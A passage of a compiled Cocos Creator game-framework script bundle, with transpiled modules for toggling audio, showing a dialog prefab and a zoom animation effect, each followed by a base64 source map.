AgIGlmIChub2RlLmlzVmFsaWQpe1xyXG4gICAgICAgICAgICAgICAgbm9kZS5kZXN0cm95KCk7XHJcbiAgICAgICAgICAgIH1cclxuICAgICAgICB9KTtcclxuICAgIH1cclxuXHJcbiAgICBzdGF0aWMgb25EaXNhYmxlRm9sbG93KG5vZGU6Y2MuTm9kZSwgZm9sbG93Tm9kZTpjYy5Ob2RlKXtcclxuICAgICAgICBsZXQgbGlmZUN5Y2xlID0gZm9sbG93Tm9kZS5hZGRDb21wb25lbnQoTGlmZUN5Y2xlKTtcclxuICAgICAgICBsaWZlQ3ljbGUuYWRkQ2FsbChcIm9uRGlzYWJsZVwiLCBmdW5jdGlvbiAoKSB7XHJcbiAgICAgICAgICAgIG5vZGUuYWN0aXZlID0gZmFsc2U7XHJcbiAgICAgICAgfSk7XHJcbiAgICB9XHJcblxyXG4gICAgc3RhdGljIG9uRW5hYmxlRm9sbG93KG5vZGU6Y2MuTm9kZSwgZm9sbG93Tm9kZTpjYy5Ob2RlKXtcclxuICAgICAgICBsZXQgbGlmZUN5Y2xlID0gZm9sbG93Tm9kZS5hZGRDb21wb25lbnQoTGlmZUN5Y2xlKTtcclxuICAgICAgICBsaWZlQ3ljbGUuYWRkQ2FsbChcIm9uRW5hYmxlXCIsIGZ1bmN0aW9uICgpIHtcclxuICAgICAgICAgICAgbm9kZS5hY3RpdmUgPSB0cnVlO1xyXG4gICAgICAgIH0pO1xyXG4gICAgfVxyXG59XHJcbiJdfQ==
//------QC-SOURCE-SPLIT------

                (function() {
                    var nodeEnv = typeof require !== 'undefined' && typeof process !== 'undefined';
                    var __module = nodeEnv ? module : {exports:{}};
                    var __filename = 'preview-scripts/assets/framework/audio/SwitchAudioCommand.js';
                    var __require = nodeEnv ? function (request) {
                        return cc.require(request);
                    } : function (request) {
                        return __quick_compile_project__.require(request, __filename);
                    };
                    function __define (exports, require, module) {
                        if (!nodeEnv) {__quick_compile_project__.registerModule(__filename, module);}"use strict";
cc._RF.push(module, '0d2e7m1GVBPX4D7BSHixkfQ', 'SwitchAudioCommand');
// framework/audio/SwitchAudioCommand.ts

// Learn TypeScript:
//  - [Chinese] http://docs.cocos.com/creator/manual/zh/scripting/typescript.html
//  - [English] http://www.cocos2d-x.org/docs/creator/manual/en/scripting/typescript.html
// Learn Attribute:
//  - [Chinese] http://docs.cocos.com/creator/manual/zh/scripting/reference/attributes.html
//  - [English] http://www.cocos2d-x.org/docs/creator/manual/en/scripting/reference/attributes.html
// Learn life-cycle callbacks:
//  - [Chinese] http://docs.cocos.com/creator/manual/zh/scripting/life-cycle-callbacks.html
//  - [English] http://www.cocos2d-x.org/docs/creator/manual/en/scripting/life-cycle-callbacks.html
Object.defineProperty(exports, "__esModule", { value: true });
var Music_1 = require("./Music");
var View_1 = require("../component/View");
var _a = cc._decorator, ccclass = _a.ccclass, property = _a.property;
var SwitchAudioCommand = /** @class */ (function () {
    function SwitchAudioCommand() {
    }
    SwitchAudioCommand.prototype.execute = function () {
        var args = [];
        for (var _i = 0; _i < arguments.length; _i++) {
            args[_i] = arguments[_i];
        }
        return __awaiter(this, void 0, Promise, function () {
            var _this = this;
            return __generator(this, function (_a) {
                return [2 /*return*/, new Promise(function (resolve) { return __awaiter(_this, void 0, void 0, function () {
                        var flag;
                        return __generator(this, function (_a) {
                            flag = !Music_1.Music.getMusicOpen();
                            if (typeof args[0] == "object" && args[0].constructor == cc.Toggle) {
                                flag = args[0].isChecked;
                                if (flag != Music_1.Music.getMusicOpen()) {
                                    View_1.default.executeClickSoundCommand(args[0], args[1]);
                                }
                            }
                            Music_1.Music.setMusicOpen(flag);
                            Music_1.Music.sfxOpen = flag;
                            Music_1.Music.persistence();
                            resolve();
                            return [2 /*return*/];
                        });
                    }); })];
            });
        });
    };
    SwitchAudioCommand = __decorate([
        ccclass("SwitchAudioCommand")
    ], SwitchAudioCommand);
    return SwitchAudioCommand;
}());
exports.default = SwitchAudioCommand;

cc._RF.pop();
                    }
                    if (nodeEnv) {
                        __define(__module.exports, __require, __module);
                    }
                    else {
                        __quick_compile_project__.registerModuleFunc(__filename, function () {
                            __define(__module.exports, __require, __module);
                        });
                    }
                })();
//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbImFzc2V0cy9mcmFtZXdvcmsvYXVkaW8vU3dpdGNoQXVkaW9Db21tYW5kLnRzIl0sIm5hbWVzIjpbXSwibWFwcGluZ3MiOiI7Ozs7Ozs7Ozs7Ozs7OztBQUFBLG9CQUFvQjtBQUNwQixpRkFBaUY7QUFDakYseUZBQXlGO0FBQ3pGLG1CQUFtQjtBQUNuQiwyRkFBMkY7QUFDM0YsbUdBQW1HO0FBQ25HLDhCQUE4QjtBQUM5QiwyRkFBMkY7QUFDM0YsbUdBQW1HOztBQU9uRyxpQ0FBOEI7QUFDOUIsMENBQXFDO0FBRS9CLElBQUEsS0FBc0IsRUFBRSxDQUFDLFVBQVUsRUFBbEMsT0FBTyxhQUFBLEVBQUUsUUFBUSxjQUFpQixDQUFDO0FBRzFDO0lBQUE7SUFpQkEsQ0FBQztJQWZTLG9DQUFPLEdBQWI7UUFBZSxjQUFPO2FBQVAsVUFBTyxFQUFQLHFCQUFPLEVBQVAsSUFBTztZQUFQLHlCQUFPOzt1Q0FBRSxPQUFPOzs7Z0JBQzNCLHNCQUFPLElBQUksT0FBTyxDQUFDLFVBQU0sT0FBTzs7OzRCQUN4QixJQUFJLEdBQUcsQ0FBQyxhQUFLLENBQUMsWUFBWSxFQUFFLENBQUM7NEJBQ2pDLElBQUksT0FBTyxJQUFJLENBQUMsQ0FBQyxDQUFDLElBQUksUUFBUSxJQUFJLElBQUksQ0FBQyxDQUFDLENBQUMsQ0FBQyxXQUFXLElBQUksRUFBRSxDQUFDLE1BQU0sRUFBQztnQ0FDL0QsSUFBSSxHQUFHLElBQUksQ0FBQyxDQUFDLENBQUMsQ0FBQyxTQUFTLENBQUM7Z0NBQ3pCLElBQUksSUFBSSxJQUFJLGFBQUssQ0FBQyxZQUFZLEVBQUUsRUFBQztvQ0FDN0IsY0FBSSxDQUFDLHdCQUF3QixDQUFDLElBQUksQ0FBQyxDQUFDLENBQUMsRUFBRSxJQUFJLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQztpQ0FDbkQ7NkJBQ0o7NEJBQ0QsYUFBSyxDQUFDLFlBQVksQ0FBQyxJQUFJLENBQUMsQ0FBQzs0QkFDekIsYUFBSyxDQUFDLE9BQU8sR0FBRyxJQUFJLENBQUM7NEJBQ3JCLGFBQUssQ0FBQyxXQUFXLEVBQUUsQ0FBQzs0QkFDcEIsT0FBTyxFQUFFLENBQUM7Ozt5QkFDYixDQUFDLEVBQUM7OztLQUNOO0lBaEJnQixrQkFBa0I7UUFEdEMsT0FBTyxDQUFDLG9CQUFvQixDQUFDO09BQ1Qsa0JBQWtCLENBaUJ0QztJQUFELHlCQUFDO0NBakJELEFBaUJDLElBQUE7a0JBakJvQixrQkFBa0IiLCJmaWxlIjoiIiwic291cmNlUm9vdCI6Ii8iLCJzb3VyY2VzQ29udGVudCI6WyIvLyBMZWFybiBUeXBlU2NyaXB0OlxyXG4vLyAgLSBbQ2hpbmVzZV0gaHR0cDovL2RvY3MuY29jb3MuY29tL2NyZWF0b3IvbWFudWFsL3poL3NjcmlwdGluZy90eXBlc2NyaXB0Lmh0bWxcclxuLy8gIC0gW0VuZ2xpc2hdIGh0dHA6Ly93d3cuY29jb3MyZC14Lm9yZy9kb2NzL2NyZWF0b3IvbWFudWFsL2VuL3NjcmlwdGluZy90eXBlc2NyaXB0Lmh0bWxcclxuLy8gTGVhcm4gQXR0cmlidXRlOlxyXG4vLyAgLSBbQ2hpbmVzZV0gaHR0cDovL2RvY3MuY29jb3MuY29tL2NyZWF0b3IvbWFudWFsL3poL3NjcmlwdGluZy9yZWZlcmVuY2UvYXR0cmlidXRlcy5odG1sXHJcbi8vICAtIFtFbmdsaXNoXSBodHRwOi8vd3d3LmNvY29zMmQteC5vcmcvZG9jcy9jcmVhdG9yL21hbnVhbC9lbi9zY3JpcHRpbmcvcmVmZXJlbmNlL2F0dHJpYnV0ZXMuaHRtbFxyXG4vLyBMZWFybiBsaWZlLWN5Y2xlIGNhbGxiYWNrczpcclxuLy8gIC0gW0NoaW5lc2VdIGh0dHA6Ly9kb2NzLmNvY29zLmNvbS9jcmVhdG9yL21hbnVhbC96aC9zY3JpcHRpbmcvbGlmZS1jeWNsZS1jYWxsYmFja3MuaHRtbFxyXG4vLyAgLSBbRW5nbGlzaF0gaHR0cDovL3d3dy5jb2NvczJkLXgub3JnL2RvY3MvY3JlYXRvci9tYW51YWwvZW4vc2NyaXB0aW5nL2xpZmUtY3ljbGUtY2FsbGJhY2tzLmh0bWxcclxuXHJcblxyXG5cclxuXHJcblxyXG5pbXBvcnQge0lDb21tYW5kfSBmcm9tIFwiLi4vZmFjYWRlL0lDb21tYW5kXCI7XHJcbmltcG9ydCB7TXVzaWN9IGZyb20gXCIuL011c2ljXCI7XHJcbmltcG9ydCBWaWV3IGZyb20gXCIuLi9jb21wb25lbnQvVmlld1wiO1xyXG5cclxuY29uc3Qge2NjY2xhc3MsIHByb3BlcnR5fSA9IGNjLl9kZWNvcmF0b3I7XHJcblxyXG5AY2NjbGFzcyhcIlN3aXRjaEF1ZGlvQ29tbWFuZFwiKVxyXG5leHBvcnQgZGVmYXVsdCBjbGFzcyBTd2l0Y2hBdWRpb0NvbW1hbmQgaW1wbGVtZW50cyBJQ29tbWFuZCB7XHJcblxyXG4gICAgYXN5bmMgZXhlY3V0ZSAoLi4uYXJncyk6UHJvbWlzZXtcclxuICAgICAgICByZXR1cm4gbmV3IFByb21pc2UoYXN5bmMgcmVzb2x2ZSA9PiB7XHJcbiAgICAgICAgICAgIGxldCBmbGFnID0gIU11c2ljLmdldE11c2ljT3BlbigpO1xyXG4gICAgICAgICAgICBpZiAodHlwZW9mIGFyZ3NbMF0gPT0gXCJvYmplY3RcIiAmJiBhcmdzWzBdLmNvbnN0cnVjdG9yID09IGNjLlRvZ2dsZSl7XHJcbiAgICAgICAgICAgICAgICBmbGFnID0gYXJnc1swXS5pc0NoZWNrZWQ7XHJcbiAgICAgICAgICAgICAgICBpZiAoZmxhZyAhPSBNdXNpYy5nZXRNdXNpY09wZW4oKSl7XHJcbiAgICAgICAgICAgICAgICAgICAgVmlldy5leGVjdXRlQ2xpY2tTb3VuZENvbW1hbmQoYXJnc1swXSwgYXJnc1sxXSk7XHJcbiAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgTXVzaWMuc2V0TXVzaWNPcGVuKGZsYWcpO1xyXG4gICAgICAgICAgICBNdXNpYy5zZnhPcGVuID0gZmxhZztcclxuICAgICAgICAgICAgTXVzaWMucGVyc2lzdGVuY2UoKTtcclxuICAgICAgICAgICAgcmVzb2x2ZSgpO1xyXG4gICAgICAgIH0pO1xyXG4gICAgfVxyXG59XHJcbiJdfQ==
//------QC-SOURCE-SPLIT------

                (function() {
                    var nodeEnv = typeof require !== 'undefined' && typeof process !== 'undefined';
                    var __module = nodeEnv ? module : {exports:{}};
                    var __filename = 'preview-scripts/assets/framework/dialog/ShowDialogCommand.js';
                    var __require = nodeEnv ? function (request) {
                        return cc.require(request);
                    } : function (request) {
                        return __quick_compile_project__.require(request, __filename);
                    };
                    function __define (exports, require, module) {
                        if (!nodeEnv) {__quick_compile_project__.registerModule(__filename, module);}"use strict";
cc._RF.push(module, '1d21aRvW3dDg4Q92XfCz8Of', 'ShowDialogCommand');
// framework/dialog/ShowDialogCommand.ts

// Learn TypeScript:
//  - [Chinese] http://docs.cocos.com/creator/manual/zh/scripting/typescript.html
//  - [English] http://www.cocos2d-x.org/docs/creator/manual/en/scripting/typescript.html
// Learn Attribute:
//  - [Chinese] http://docs.cocos.com/creator/manual/zh/scripting/reference/attributes.html
//  - [English] http://www.cocos2d-x.org/docs/creator/manual/en/scripting/reference/attributes.html
// Learn life-cycle callbacks:
//  - [Chinese] http://docs.cocos.com/creator/manual/zh/scripting/life-cycle-callbacks.html
//  - [English] http://www.cocos2d-x.org/docs/creator/manual/en/scripting/life-cycle-callbacks.html
Object.defineProperty(exports, "__esModule", { value: true });
var Facade_1 = require("../facade/Facade");
var LifeCycle_1 = require("../component/LifeCycle");
var DialogMediator_1 = require("./DialogMediator");
var _a = cc._decorator, ccclass = _a.ccclass, property = _a.property;
var ShowDialogCommand = /** @class */ (function () {
    function ShowDialogCommand() {
    }
    ShowDialogCommand.prototype.execute = function () {
        var args = [];
        for (var _i = 0; _i < arguments.length; _i++) {
            args[_i] = arguments[_i];
        }
        return __awaiter(this, void 0, Promise, function () {
            var _this = this;
            return __generator(this, function (_a) {
                return [2 /*return*/, new Promise(function (resolve, reject) { return __awaiter(_this, void 0, void 0, function () {
                        var separationLayer, prefab, node, obj, mediator, key, attr, res, e_1;
                        return __generator(this, function (_a) {
                            switch (_a.label) {
                                case 0:
                                    separationLayer = Facade_1.default.addSeparationLayer(args[1], args[2]);
                                    return [4 /*yield*/, cc.loader.loadResAwait(DialogMediator_1.default.dialogPrefabName, cc.Prefab)];
                                case 1:
                                    prefab = _a.sent();
                                    node = cc.instantiate(prefab);
                                    node.setParent(Facade_1.default.canvasNode);
                                    LifeCycle_1.default.onDestroyFollow(separationLayer, node);
                                    obj = args[0];
                                    mediator = node.getComponent(DialogMediator_1.default);
                                    for (key in obj) {
                                        if (obj[key] != null && typeof obj[key] != "function") {
                                            for (attr in obj[key]) {
                                                mediator[key][attr] = obj[key][attr];
                                            }
                                        }
                                    }
                                    _a.label = 2;
                                case 2:
                                    _a.trys.push([2, 4, , 5]);
                                    return [4 /*yield*/, node.onceAwait("clickButton")];
                                case 3:
                                    res = _a.sent();
                                    resolve(res);
                                    return [3 /*break*/, 5];
                                case 4:
                                    e_1 = _a.sent();
                                    reject(e_1);
                                    return [3 /*break*/, 5];
                                case 5: return [2 /*return*/];
                            }
                        });
                    }); })];
            });
        });
    };
    ShowDialogCommand = __decorate([
        ccclass("ShowDialogCommand")
    ], ShowDialogCommand);
    return ShowDialogCommand;
}());
exports.default = ShowDialogCommand;

cc._RF.pop();
                    }
                    if (nodeEnv) {
                        __define(__module.exports, __require, __module);
                    }
                    else {
                        __quick_compile_project__.registerModuleFunc(__filename, function () {
                            __define(__module.exports, __require, __module);
                        });
                    }
                })();
//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbImFzc2V0cy9mcmFtZXdvcmsvZGlhbG9nL1Nob3dEaWFsb2dDb21tYW5kLnRzIl0sIm5hbWVzIjpbXSwibWFwcGluZ3MiOiI7Ozs7Ozs7Ozs7Ozs7OztBQUFBLG9CQUFvQjtBQUNwQixpRkFBaUY7QUFDakYseUZBQXlGO0FBQ3pGLG1CQUFtQjtBQUNuQiwyRkFBMkY7QUFDM0YsbUdBQW1HO0FBQ25HLDhCQUE4QjtBQUM5QiwyRkFBMkY7QUFDM0YsbUdBQW1HOztBQUluRywyQ0FBc0M7QUFDdEMsb0RBQStDO0FBQy9DLG1EQUE4QztBQUV4QyxJQUFBLEtBQXNCLEVBQUUsQ0FBQyxVQUFVLEVBQWxDLE9BQU8sYUFBQSxFQUFFLFFBQVEsY0FBaUIsQ0FBQztBQUcxQztJQUFBO0lBNkJBLENBQUM7SUE1QlMsbUNBQU8sR0FBYjtRQUFlLGNBQU87YUFBUCxVQUFPLEVBQVAscUJBQU8sRUFBUCxJQUFPO1lBQVAseUJBQU87O3VDQUFFLE9BQU87OztnQkFDM0Isc0JBQU8sSUFBSSxPQUFPLENBQUMsVUFBTyxPQUFPLEVBQUUsTUFBTTs7Ozs7b0NBQ2pDLGVBQWUsR0FBRyxnQkFBTSxDQUFDLGtCQUFrQixDQUFDLElBQUksQ0FBQyxDQUFDLENBQUMsRUFBRSxJQUFJLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQztvQ0FDckQscUJBQU0sRUFBRSxDQUFDLE1BQU0sQ0FBQyxZQUFZLENBQUMsd0JBQWMsQ0FBQyxnQkFBZ0IsRUFBRSxFQUFFLENBQUMsTUFBTSxDQUFDLEVBQUE7O29DQUFqRixNQUFNLEdBQUcsU0FBd0U7b0NBQ2pGLElBQUksR0FBRyxFQUFFLENBQUMsV0FBVyxDQUFDLE1BQU0sQ0FBQyxDQUFDO29DQUNsQyxJQUFJLENBQUMsU0FBUyxDQUFDLGdCQUFNLENBQUMsVUFBVSxDQUFDLENBQUM7b0NBQ2xDLG1CQUFTLENBQUMsZUFBZSxDQUFDLGVBQWUsRUFBRSxJQUFJLENBQUMsQ0FBQztvQ0FFN0MsR0FBRyxHQUFhLElBQUksQ0FBQyxDQUFDLENBQUMsQ0FBQztvQ0FDeEIsUUFBUSxHQUFHLElBQUksQ0FBQyxZQUFZLENBQUMsd0JBQWMsQ0FBQyxDQUFDO29DQUVqRCxLQUFTLEdBQUcsSUFBSSxHQUFHLEVBQUM7d0NBQ2hCLElBQUksR0FBRyxDQUFDLEdBQUcsQ0FBQyxJQUFJLElBQUksSUFBSSxPQUFPLEdBQUcsQ0FBQyxHQUFHLENBQUMsSUFBSSxVQUFVLEVBQUM7NENBQ2xELEtBQVEsSUFBSSxJQUFJLEdBQUcsQ0FBQyxHQUFHLENBQUMsRUFBQztnREFDckIsUUFBUSxDQUFDLEdBQUcsQ0FBQyxDQUFDLElBQUksQ0FBQyxHQUFHLEdBQUcsQ0FBQyxHQUFHLENBQUMsQ0FBQyxJQUFJLENBQUMsQ0FBQzs2Q0FDeEM7eUNBQ0o7cUNBQ0o7Ozs7b0NBSWEscUJBQU0sSUFBSSxDQUFDLFNBQVMsQ0FBQyxhQUFhLENBQUMsRUFBQTs7b0NBQXpDLEdBQUcsR0FBRyxTQUFtQztvQ0FDN0MsT0FBTyxDQUFDLEdBQUcsQ0FBQyxDQUFDOzs7O29DQUViLE1BQU0sQ0FBQyxHQUFDLENBQUMsQ0FBQzs7Ozs7eUJBRWpCLENBQUMsRUFBQzs7O0tBQ047SUE1QmdCLGlCQUFpQjtRQURyQyxPQUFPLENBQUMsbUJBQW1CLENBQUM7T0FDUixpQkFBaUIsQ0E2QnJDO0lBQUQsd0JBQUM7Q0E3QkQsQUE2QkMsSUFBQTtrQkE3Qm9CLGlCQUFpQiIsImZpbGUiOiIiLCJzb3VyY2VSb290IjoiLyIsInNvdXJjZXNDb250ZW50IjpbIi8vIExlYXJuIFR5cGVTY3JpcHQ6XHJcbi8vICAtIFtDaGluZXNlXSBodHRwOi8vZG9jcy5jb2Nvcy5jb20vY3JlYXRvci9tYW51YWwvemgvc2NyaXB0aW5nL3R5cGVzY3JpcHQuaHRtbFxyXG4vLyAgLSBbRW5nbGlzaF0gaHR0cDovL3d3dy5jb2NvczJkLXgub3JnL2RvY3MvY3JlYXRvci9tYW51YWwvZW4vc2NyaXB0aW5nL3R5cGVzY3JpcHQuaHRtbFxyXG4vLyBMZWFybiBBdHRyaWJ1dGU6XHJcbi8vICAtIFtDaGluZXNlXSBodHRwOi8vZG9jcy5jb2Nvcy5jb20vY3JlYXRvci9tYW51YWwvemgvc2NyaXB0aW5nL3JlZmVyZW5jZS9hdHRyaWJ1dGVzLmh0bWxcclxuLy8gIC0gW0VuZ2xpc2hdIGh0dHA6Ly93d3cuY29jb3MyZC14Lm9yZy9kb2NzL2NyZWF0b3IvbWFudWFsL2VuL3NjcmlwdGluZy9yZWZlcmVuY2UvYXR0cmlidXRlcy5odG1sXHJcbi8vIExlYXJuIGxpZmUtY3ljbGUgY2FsbGJhY2tzOlxyXG4vLyAgLSBbQ2hpbmVzZV0gaHR0cDovL2RvY3MuY29jb3MuY29tL2NyZWF0b3IvbWFudWFsL3poL3NjcmlwdGluZy9saWZlLWN5Y2xlLWNhbGxiYWNrcy5odG1sXHJcbi8vICAtIFtFbmdsaXNoXSBodHRwOi8vd3d3LmNvY29zMmQteC5vcmcvZG9jcy9jcmVhdG9yL21hbnVhbC9lbi9zY3JpcHRpbmcvbGlmZS1jeWNsZS1jYWxsYmFja3MuaHRtbFxyXG5cclxuaW1wb3J0IHtEaWFsb2dWT30gZnJvbSBcIi4vRGlhbG9nVk9cIjtcclxuaW1wb3J0IHtJQ29tbWFuZH0gZnJvbSBcIi4uL2ZhY2FkZS9JQ29tbWFuZFwiO1xyXG5pbXBvcnQgRmFjYWRlIGZyb20gXCIuLi9mYWNhZGUvRmFjYWRlXCI7XHJcbmltcG9ydCBMaWZlQ3ljbGUgZnJvbSBcIi4uL2NvbXBvbmVudC9MaWZlQ3ljbGVcIjtcclxuaW1wb3J0IERpYWxvZ01lZGlhdG9yIGZyb20gXCIuL0RpYWxvZ01lZGlhdG9yXCI7XHJcblxyXG5jb25zdCB7Y2NjbGFzcywgcHJvcGVydHl9ID0gY2MuX2RlY29yYXRvcjtcclxuXHJcbkBjY2NsYXNzKFwiU2hvd0RpYWxvZ0NvbW1hbmRcIilcclxuZXhwb3J0IGRlZmF1bHQgY2xhc3MgU2hvd0RpYWxvZ0NvbW1hbmQgaW1wbGVtZW50cyBJQ29tbWFuZCB7XHJcbiAgICBhc3luYyBleGVjdXRlICguLi5hcmdzKTpQcm9taXNle1xyXG4gICAgICAgIHJldHVybiBuZXcgUHJvbWlzZShhc3luYyAocmVzb2x2ZSwgcmVqZWN0KSA9PiB7XHJcbiAgICAgICAgICAgIGxldCBzZXBhcmF0aW9uTGF5ZXIgPSBGYWNhZGUuYWRkU2VwYXJhdGlvbkxheWVyKGFyZ3NbMV0sIGFyZ3NbMl0pO1xyXG4gICAgICAgICAgICBsZXQgcHJlZmFiID0gYXdhaXQgY2MubG9hZGVyLmxvYWRSZXNBd2FpdChEaWFsb2dNZWRpYXRvci5kaWFsb2dQcmVmYWJOYW1lLCBjYy5QcmVmYWIpO1xyXG4gICAgICAgICAgICBsZXQgbm9kZSA9IGNjLmluc3RhbnRpYXRlKHByZWZhYik7XHJcbiAgICAgICAgICAgIG5vZGUuc2V0UGFyZW50KEZhY2FkZS5jYW52YXNOb2RlKTtcclxuICAgICAgICAgICAgTGlmZUN5Y2xlLm9uRGVzdHJveUZvbGxvdyhzZXBhcmF0aW9uTGF5ZXIsIG5vZGUpO1xyXG5cclxuICAgICAgICAgICAgbGV0IG9iaiA9IDxEaWFsb2dWTz5hcmdzWzBdO1xyXG4gICAgICAgICAgICBsZXQgbWVkaWF0b3IgPSBub2RlLmdldENvbXBvbmVudChEaWFsb2dNZWRpYXRvcik7XHJcblxyXG4gICAgICAgICAgICBmb3IgKGxldCBrZXkgaW4gb2JqKXtcclxuICAgICAgICAgICAgICAgIGlmIChvYmpba2V5XSAhPSBudWxsICYmIHR5cGVvZiBvYmpba2V5XSAhPSBcImZ1bmN0aW9uXCIpe1xyXG4gICAgICAgICAgICAgICAgICAgIGZvcihsZXQgYXR0ciBpbiBvYmpba2V5XSl7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIG1lZGlhdG9yW2tleV1bYXR0cl0gPSBvYmpba2V5XVthdHRyXTtcclxuICAgICAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgLy8gbWVkaWF0b3IuY29udGVudC5ub2RlLmNoaWxkcmVuLmZvckVhY2godmFsdWUgPT4gdmFsdWUuYWN0aXZlID0gdHJ1ZSk7XHJcblxyXG4gICAgICAgICAgICB0cnkge1xyXG4gICAgICAgICAgICAgICAgbGV0IHJlcyA9IGF3YWl0IG5vZGUub25jZUF3YWl0KFwiY2xpY2tCdXR0b25cIik7XHJcbiAgICAgICAgICAgICAgICByZXNvbHZlKHJlcyk7XHJcbiAgICAgICAgICAgIH0gY2F0Y2ggKGUpIHtcclxuICAgICAgICAgICAgICAgIHJlamVjdChlKTtcclxuICAgICAgICAgICAgfVxyXG4gICAgICAgIH0pO1xyXG4gICAgfVxyXG59XHJcbiJdfQ==
//------QC-SOURCE-SPLIT------

                (function() {
                    var nodeEnv = typeof require !== 'undefined' && typeof process !== 'undefined';
                    var __module = nodeEnv ? module : {exports:{}};
                    var __filename = 'preview-scripts/assets/framework/component/ZoomEffect.js';
                    var __require = nodeEnv ? function (request) {
                        return cc.require(request);
                    } : function (request) {
                        return __quick_compile_project__.require(request, __filename);
                    };
                    function __define (exports, require, module) {
                        if (!nodeEnv) {__quick_compile_project__.registerModule(__filename, module);}"use strict";
cc._RF.push(module, 'a29edWktkRN94LMtiNKO1En', 'ZoomEffect');
// framework/component/ZoomEffect.ts

Object.defineProperty(exports, "__esModule", { value: true });
var Actions_1 = require("../actions/Actions");
var _a = cc._decorator, ccclass = _a.ccclass, property = _a.property;
var ZoomEffect = /** @class */ (function (_super) {
    __extends(ZoomEffect, _super);
    function ZoomEffect() {
        var _this = _super !== null && _super.apply(this, arguments) || this;
        _this.startValue = 1;
        _this.endValue = 1;
        _this.deltaValue = 0.1;
        _this.speed = 1 / 0.8;
        _this.times = 0;
        _this.damping = 0;
        _this.cycleDelay = 0;
        _this.repeatNum = 0;
        _this.repeatDelay = 0;
        return _this;
    }
    ZoomEffect.prototype.onLoad = function () {
        var action = Actions_1.default.cycleAction(cc.scaleTo, this.startValue, this.endValue, this.deltaValue, this.speed, this.times, this.damping, this.cycleDelay);
        if (this.repeatNum > 0) {
            action = cc.repeat(cc.sequence(action, cc.delayTime(this.repeatDelay)), this.repeatNum);
        }
        else if (this.repeatNum < 0) {
            action = cc.repeatForever(cc.sequence(action, cc.delayTime(this.repeatDelay)));
        }
        this.node.runAction(action);
    };
    __decorate([
        property({ displayName: "开始缩放值" })
    ], ZoomEffect.prototype, "startValue", void 0);
    __decorate([
        property({ displayName: "结束缩放值" })
    ], ZoomEffect.prototype, "endValue", void 0);
    __decorate([
        property({ displayName: "缩放差" })
    ], ZoomEffect.prototype, "deltaValue", void 0);
    __decorate([
        property({ displayName: "速度" })
    ], ZoomEffect.prototype, "speed", void 0);
    __decorate([
        property({ displayName: "缩放次数" })
    ], ZoomEffect.prototype, "times", void 0);
    __decorate([
        property({ displayName: "衰减值" })
    ], ZoomEffect.prototype, "damping", void 0);
    __decorate([
        property({ displayName: "周期性延时", textTips: "单摆到最高点时延时" })
    ], ZoomEffect.prototype, "cycleDelay", void 0);
    __decorate([
        property({ displayName: "重复", textTips: "小于零表示repeatForever" })
    ], ZoomEffect.prototype, "repeatNum", void 0);
    __decorate([
        property({ displayName: "重复延时", textTips: "重复次数不等于0时才有效" })
    ], ZoomEffect.prototype, "repeatDelay", void 0);
    ZoomEffect = __decorate([
        ccclass
    ], ZoomEffect);
    return ZoomEffect;
}(cc.Component));
exports.default = ZoomEffect;

cc._RF.pop();
                    }
                    if (nodeEnv) {
                        __define(__module.exports, __require, __module);
                    }
                    else {
                        __quick_compile_project__.registerModuleFunc(__filename, function () {
                            __define(__module.exports, __require, __module);
                        });
                    }
                })();
//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbImFzc2V0cy9mcmFtZXdvcmsvY29tcG9uZW50L1pvb21FZmZlY3QudHMiXSwibmFtZXMiOltdLCJtYXBwaW5ncyI6Ijs7Ozs7Ozs7Ozs7Ozs7OztBQUNBLDhDQUF5QztBQUVuQyxJQUFBLEtBQXNCLEVBQUUsQ0FBQyxVQUFVLEVBQWxDLE9BQU8sYUFBQSxFQUFFLFFBQVEsY0FBaUIsQ0FBQztBQUcxQztJQUF3Qyw4QkFBWTtJQUFwRDtRQUFBLHFFQXNDQztRQW5DRyxnQkFBVSxHQUFHLENBQUMsQ0FBQztRQUdmLGNBQVEsR0FBRyxDQUFDLENBQUM7UUFHYixnQkFBVSxHQUFHLEdBQUcsQ0FBQztRQUdqQixXQUFLLEdBQUcsQ0FBQyxHQUFDLEdBQUcsQ0FBQztRQUdkLFdBQUssR0FBRyxDQUFDLENBQUM7UUFHVixhQUFPLEdBQUcsQ0FBQyxDQUFDO1FBR1osZ0JBQVUsR0FBRyxDQUFDLENBQUM7UUFHZixlQUFTLEdBQUcsQ0FBQyxDQUFDO1FBR2QsaUJBQVcsR0FBRyxDQUFDLENBQUM7O0lBV3BCLENBQUM7SUFURywyQkFBTSxHQUFOO1FBQ0ksSUFBSSxNQUFNLEdBQUcsaUJBQU8sQ0FBQyxXQUFXLENBQUMsRUFBRSxDQUFDLE9BQU8sRUFBRSxJQUFJLENBQUMsVUFBVSxFQUFFLElBQUksQ0FBQyxRQUFRLEVBQUUsSUFBSSxDQUFDLFVBQVUsRUFBRSxJQUFJLENBQUMsS0FBSyxFQUFFLElBQUksQ0FBQyxLQUFLLEVBQUUsSUFBSSxDQUFDLE9BQU8sRUFBRSxJQUFJLENBQUMsVUFBVSxDQUFDLENBQUM7UUFDckosSUFBSSxJQUFJLENBQUMsU0FBUyxHQUFHLENBQUMsRUFBQztZQUNuQixNQUFNLEdBQUcsRUFBRSxDQUFDLE1BQU0sQ0FBQyxFQUFFLENBQUMsUUFBUSxDQUFDLE1BQU0sRUFBRSxFQUFFLENBQUMsU0FBUyxDQUFDLElBQUksQ0FBQyxXQUFXLENBQUMsQ0FBQyxFQUFFLElBQUksQ0FBQyxTQUFTLENBQUMsQ0FBQztTQUMzRjthQUFNLElBQUksSUFBSSxDQUFDLFNBQVMsR0FBRyxDQUFDLEVBQUM7WUFDMUIsTUFBTSxHQUFHLEVBQUUsQ0FBQyxhQUFhLENBQUMsRUFBRSxDQUFDLFFBQVEsQ0FBQyxNQUFNLEVBQUUsRUFBRSxDQUFDLFNBQVMsQ0FBQyxJQUFJLENBQUMsV0FBVyxDQUFDLENBQUMs